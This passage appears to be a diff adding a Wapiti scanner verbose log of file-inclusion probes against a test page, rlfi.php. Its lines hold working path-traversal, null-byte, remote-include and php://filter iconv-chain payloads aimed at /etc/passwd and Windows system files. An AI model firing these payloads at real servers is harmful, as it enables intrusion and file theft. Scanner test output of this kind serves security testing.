+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=109
+2024-03-20 16:55:52.496 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&bug=109
+2024-03-20 16:55:52.504 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=109
+2024-03-20 16:55:52.512 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=109
+2024-03-20 16:55:52.522 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=109
+2024-03-20 16:55:52.528 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=109
+2024-03-20 16:55:52.535 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=109
+2024-03-20 16:55:52.543 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=109
+2024-03-20 16:55:52.549 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=109
+2024-03-20 16:55:52.558 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=109
+2024-03-20 16:55:52.566 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=109
+2024-03-20 16:55:52.574 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=109
+2024-03-20 16:55:52.581 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=109
+2024-03-20 16:55:52.588 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=109
+2024-03-20 16:55:52.598 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=109
+2024-03-20 16:55:52.606 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&bug=109
+2024-03-20 16:55:52.615 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=109
+2024-03-20 16:55:52.623 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&bug=109
+2024-03-20 16:55:52.630 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=109
+2024-03-20 16:55:52.638 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&bug=109
+2024-03-20 16:55:52.646 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=109
+2024-03-20 16:55:52.654 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&bug=109
+2024-03-20 16:55:52.663 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=109
+2024-03-20 16:55:52.673 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=109
+2024-03-20 16:55:52.681 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=109
+2024-03-20 16:55:52.689 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=109
+2024-03-20 16:55:52.697 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=file%3A%2F%2F%2Fetc%2Fpasswd&bug=109
+2024-03-20 16:55:52.705 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&bug=109
+2024-03-20 16:55:52.713 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&bug=109
+2024-03-20 16:55:52.722 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&bug=109
+2024-03-20 16:55:52.729 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&bug=109
+2024-03-20 16:55:52.738 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&bug=109
+2024-03-20 16:55:52.746 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&bug=109
+2024-03-20 16:55:52.756 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&bug=109
+2024-03-20 16:55:52.765 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=rlfi.php&bug=109
+2024-03-20 16:55:52.775 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=rlfi.php%00&bug=109
+2024-03-20 16:55:52.783 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=rlfi.php%3A%3A%24DATA&bug=109
+2024-03-20 16:55:52.794 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php
+2024-03-20 16:55:52.802 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00
+2024-03-20 16:55:52.811 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=%2Fetc%2Fpasswd
+2024-03-20 16:55:52.819 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=%2Fetc%2Fpasswd%00
+2024-03-20 16:55:52.827 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=%2Fetc%2Fservices
+2024-03-20 16:55:52.835 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=%2Fetc%2Fservices%00
+2024-03-20 16:55:52.844 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices
+2024-03-20 16:55:52.852 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00
+2024-03-20 16:55:52.862 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA
+2024-03-20 16:55:52.870 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:52.878 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:52.886 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA
+2024-03-20 16:55:52.895 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F
+2024-03-20 16:55:52.903 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F
+2024-03-20 16:55:52.911 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:52.920 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+2024-03-20 16:55:52.927 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:52.935 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00
+2024-03-20 16:55:52.944 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:52.953 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices
+2024-03-20 16:55:52.962 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:52.970 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00
+2024-03-20 16:55:52.979 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:52.988 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices
+2024-03-20 16:55:52.996 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:53.004 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00
+2024-03-20 16:55:53.012 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/rlfi.php (1)
+	data: form_bug=&bug=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.86